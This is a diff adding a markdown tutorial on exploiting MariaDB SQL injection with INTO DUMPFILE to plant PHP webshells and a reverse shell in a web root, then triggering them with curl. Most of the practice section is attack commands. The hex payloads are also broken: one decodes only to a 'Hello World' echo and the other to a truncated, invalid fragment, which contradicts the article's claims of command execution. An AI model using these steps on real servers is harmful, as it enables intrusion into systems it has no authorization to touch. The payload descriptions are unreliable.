@@ -1,0 +1,84 @@
+---
+title: Deploying Webshell via DUMPFILE Function in MariaDB
+description: Learn to exploit MariaDB SQL Injection to deploy webshells using DUMPFILE
+  for command execution.
+keywords:
+- webshell
+- DUMPFILE
+- MariaDB
+- SQL Injection
+- command execution
+- hexadecimal encoding
+- PHP reverse shell
+---
+
+# WEBSHELL - DUMPFILE
+
+## Context
+
+In this article, you will learn how to leverage MariaDB SQL Injection to execute commands through a webshell using the DUMPFILE function. Understanding this technique assumes prior knowledge of SQL queries, file system permissions, hexadecimal encoding, and MariaDB command execution methods.
+
+## Theory
+
+### DUMPFILE Functionality in MariaDB
+
+The DUMPFILE command in MariaDB allows writing of binary data directly to a specified file. In an attack context, this can be exploited via SQL Injection vulnerabilities to write arbitrary files to a system. When you have write permissions, you can use DUMPFILE to drop a crafted payload into a web-accessible directory, enabling further exploitation.
+
+### Hexadecimal Encoding for Payloads
+
+Hexadecimal encoding is a technique used to represent binary data in a string format that can be easily used in SQL queries. This representation is crucial when injecting binary data, such as a webshell, because it ensures that the data can be transmitted and stored without corruption.
+
+### Webshell Deployment via SQL Injection
+
+In deploying a webshell through SQL injection, the attacker aims to write a malicious PHP script into a web-accessible directory. This requires having adequate write permissions in the directory where the file is intended to be saved. Upon successful deployment, this webshell can be accessed remotely to execute arbitrary commands.
+
+## Practice
+
+### Webshell Deployment via DUMPFILE
+
+In this exercise, we will deploy a simple PHP webshell in a web-accessible directory using the DUMPFILE technique.
+
+- **Inject the webshell:**
+
+    ```bash
+    SELECT 0x3C3F706870206563686F202748656C6C6F20576F726C6421273B3F3E INTO DUMPFILE '/var/www/html/shell.php';
+    ```
+
+    This command injects a simple PHP webshell that outputs "Hello World!" when accessed.
+
+- **Access the deployed webshell:**
+
+    ```bash
+    curl http://target.com/shell.php
+    ```
+
+    Accessing the URL triggers the PHP code, resulting in command execution capabilities through the webshell.
+
+### Hex Encoding a Complex Payload
+
+In cases where a more complex payload, such as a PHP reverse shell, is required, hex encoding will be utilized.
+
+- **Convert PHP reverse shell script to hex:**
+
+    Use an encoding tool to convert your script into a hexadecimal format.
+
+- **Inject the reverse shell payload:**
+
+    ```bash
+    SELECT 0x3C3F706870206578656320247368656C6C3D272F62696E2F7368202D6920272E2E2E INTO DUMPFILE '/var/www/html/reverse.php';
+    ```
+
+    This writes the encoded reverse shell to the web directory.
+
+- **Trigger the reverse shell:**
+
+    ```bash
+    curl http://target.com/reverse.php
+    ```
+
+    Accessing the URL executes the payload, connecting back to your machine to establish a remote shell.
+
+## Tools
+
+- **curl**
+- **hex_encoder**
